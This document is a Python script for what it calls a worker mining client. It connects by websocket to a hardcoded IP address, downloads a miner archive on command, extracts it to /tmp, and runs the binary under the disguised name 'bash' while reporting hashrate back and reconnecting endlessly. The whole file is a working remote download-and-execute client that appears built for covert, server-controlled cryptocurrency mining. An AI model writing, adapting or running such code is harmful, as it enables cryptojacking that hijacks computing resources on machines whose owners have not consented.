import asyncio
import os
import re
import shutil
import subprocess
import tarfile

import websockets


# ============================================================
# SERVER
# ============================================================

SERVER = "ws://188.166.246.56:443/ws/worker"


# ============================================================
# DIRECTORY
# ============================================================

WORK_DIR = "/tmp/xrigstak1"
ARCHIVE = "/tmp/xrigstak1.tar.gz"
EXTRACT_DIR = "/tmp/miner_extract"

MINER = os.path.join(
    WORK_DIR,
    "bash"
)


# ============================================================
# RECEIVE MINER
# ============================================================

async def receive_miner(ws, size):

    print()
    print("=" * 60)
    print("[*] RECEIVING MINER")
    print("=" * 60)

    print(f"[*] Expected size : {size} bytes")

    received = 0

    with open(
        ARCHIVE,
        "wb"
    ) as f:

        while received < size:

            data = await ws.recv()

            if not isinstance(data, bytes):
                print(
                    "[!] Ignoring text:",
                    data
                )
                continue

            f.write(data)

            received += len(data)

            print(
                f"[*] Received: "
                f"{received}/{size} bytes"
            )

    if received != size:

        raise RuntimeError(
            f"Archive incomplete: "
            f"{received}/{size}"
        )

    print("[+] MINER ARCHIVE RECEIVED")


# ============================================================
# EXTRACT MINER
# ============================================================

def extract_miner():

    print()
    print("=" * 60)
    print("[*] EXTRACTING MINER")
    print("=" * 60)

    # Hapus directory lama
    if os.path.exists(WORK_DIR):

        print(
            f"[*] Removing old: {WORK_DIR}"
        )

        shutil.rmtree(
            WORK_DIR
        )

    # Hapus extract lama
    if os.path.exists(EXTRACT_DIR):

        shutil.rmtree(
            EXTRACT_DIR
        )

    os.makedirs(
        EXTRACT_DIR
    )

    # Extract
    print(
        "[*] Extracting archive..."
    )

    with tarfile.open(
        ARCHIVE,
        "r:gz"
    ) as tar:

        tar.extractall(
            EXTRACT_DIR
        )

    extracted = os.path.join(
        EXTRACT_DIR,
        "xrigstak1"
    )

    if not os.path.exists(
        extracted
    ):

        raise RuntimeError(
            "xrigstak1 directory not found "
            "after extraction"
        )

    # Pindahkan ke WORK_DIR
    shutil.move(
        extracted,
        WORK_DIR
    )

    # Hapus archive
    if os.path.exists(
        ARCHIVE
    ):

        os.remove(
            ARCHIVE
        )

    # Hapus temporary directory
    shutil.rmtree(
        EXTRACT_DIR,
        ignore_errors=True
    )

    # Make executable
    os.chmod(
        MINER,
        0o755
    )

    print()
    print("[+] MINER READY")

    print()
    print("[*] Miner files:")

    for filename in sorted(
        os.listdir(WORK_DIR)
    ):

        path = os.path.join(
            WORK_DIR,
            filename
        )

        if os.path.isfile(path):

            size = os.path.getsize(
                path
            )

            print(
                f"    {filename:<20} "
                f"{size} bytes"
            )


# ============================================================
# CHECK MINER FILES
# ============================================================

def check_miner():

    print()
    print("=" * 60)
    print("[*] CHECKING MINER")
    print("=" * 60)

    required = [
        "bash",
        "config.txt",
        "cpu.txt",
        "pools.txt"
    ]

    for filename in required:

        path = os.path.join(
            WORK_DIR,
            filename
        )

        if os.path.exists(path):

            size = os.path.getsize(
                path
            )

            print(
                f"[OK] {filename} "
                f"({size} bytes)"
            )

        else:

            print(
                f"[ERROR] Missing: {filename}"
            )

            raise RuntimeError(
                f"Missing miner file: {filename}"
            )

    # Check executable
    if not os.access(
        MINER,
        os.X_OK
    ):

        print(
            "[*] Setting executable permission"
        )

        os.chmod(
            MINER,
            0o755
        )

    print()
    print("[+] Miner files OK")


# ============================================================
# SHOW CONFIG
# ============================================================

def show_config():

    print()
    print("=" * 60)
    print("[*] MINER CONFIGURATION")
    print("=" * 60)

    for filename in [
        "pools.txt",
        "cpu.txt",
        "config.txt"
    ]:

        path = os.path.join(
            WORK_DIR,
            filename
        )

        print()
        print(
            f"===== {filename} ====="
        )

        try:

            with open(
                path,
                "r",
                errors="replace"
            ) as f:

                print(
                    f.read()
                )

        except Exception as e:

            print(
                "[ERROR]",
                e
            )

    print(
        "=" * 60
    )


# ============================================================
# RUN MINER
# ============================================================

async def run_miner(ws):

    print()
    print("=" * 60)
    print("[*] STARTING MINER")
    print("=" * 60)

    print(
        "[*] Command:",
        MINER,
        "--noTest"
    )

    print(
        "[*] Working directory:",
        WORK_DIR
    )

    print()
    print("=" * 60)
    print("[MINER OUTPUT]")
    print("=" * 60)

    process = subprocess.Popen(
        [
            MINER,
            "--noTest"
        ],
        cwd=WORK_DIR,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )

    last_hashrate = None

    while True:

        line = await asyncio.to_thread(
            process.stdout.readline
        )

        if not line:

            break

        line = line.rstrip()

        # Tampilkan SEMUA output miner
        print(
            "[MINER]",
            line
        )

        # ====================================================
        # HASHRATE PARSER
        # ====================================================

        match = re.search(
            r"Totals \(CPU\):\s+"
            r"([0-9.]+)\s+"
            r"([0-9.]+)\s+"
            r"([0-9.]+)\s+"
            r"H/s",
            line
        )

        if match:

            hashrate = match.group(1)

            if hashrate != last_hashrate:

                print()
                print(
                    f">>> HASHRATE: "
                    f"{hashrate} H/s"
                )

                try:

                    await ws.send(
                        f"HASHRATE:{hashrate}"
                    )

                except Exception as e:

                    print(
                        "[!] Failed sending "
                        "hashrate:",
                        e
                    )

                last_hashrate = hashrate

    return_code = process.wait()

    print()
    print("=" * 60)
    print(
        f"[!] MINER STOPPED"
    )
    print(
        f"[!] Exit code: {return_code}"
    )
    print("=" * 60)


# ============================================================
# MAIN
# ============================================================

async def main():

    print()
    print("=" * 60)
    print("        WORKER MINING CLIENT")
    print("=" * 60)

    print(
        "[*] Worker ID: worker1"
    )

    print(
        "[*] Server:",
        SERVER
    )

    print()

    while True:

        try:

            print(
                "[*] Connecting..."
            )

            async with websockets.connect(
                SERVER,
                max_size=2 * 1024 * 1024
            ) as ws:

                print(
                    "[+] WEBSOCKET CONNECTED"
                )

                while True:

                    message = await ws.recv()

                    # Binary message
                    if isinstance(
                        message,
                        bytes
                    ):

                        print(
                            "[BINARY]",
                            len(message),
                            "bytes"
                        )

                        continue

                    print(
                        "[SERVER]",
                        message
                    )

                    # ==================================================
                    # START
                    # ==================================================

                    if message == "START":

                        print()
                        print(
                            "[+] START COMMAND RECEIVED"
                        )

                        # Receive MINER_SIZE
                        size_message = await ws.recv()

                        if not isinstance(
                            size_message,
                            str
                        ):

                            raise RuntimeError(
                                "Expected MINER_SIZE"
                            )

                        print(
                            "[SERVER]",
                            size_message
                        )

                        if not size_message.startswith(
                            "MINER_SIZE:"
                        ):

                            raise RuntimeError(
                                "Invalid MINER_SIZE"
                            )

                        size = int(
                            size_message.split(
                                ":",
                                1
                            )[1]
                        )

                        # Receive archive
                        await receive_miner(
                            ws,
                            size
                        )

                        # Extract
                        extract_miner()

                        # Check files
                        check_miner()

                        # Show config
                        show_config()

                        # Run miner
                        await run_miner(
                            ws
                        )

                    # ==================================================
                    # STOP
                    # ==================================================

                    elif message == "STOP":

                        print(
                            "[+] STOP COMMAND RECEIVED"
                        )

                        return

        except (
            websockets.exceptions.ConnectionClosed,
            ConnectionRefusedError,
            OSError
        ) as e:

            print()
            print(
                "[!] Connection lost:"
            )
            print(
                e
            )

            print(
                "[*] Reconnecting in 5 seconds..."
            )

            await asyncio.sleep(
                5
            )

        except Exception as e:

            print()
            print(
                "[!] WORKER ERROR:"
            )
            print(
                repr(e)
            )

            print(
                "[*] Reconnecting in 5 seconds..."
            )

            await asyncio.sleep(
                5
            )


# ============================================================
# START
# ============================================================

if __name__ == "__main__":

    asyncio.run(
        main()
    )
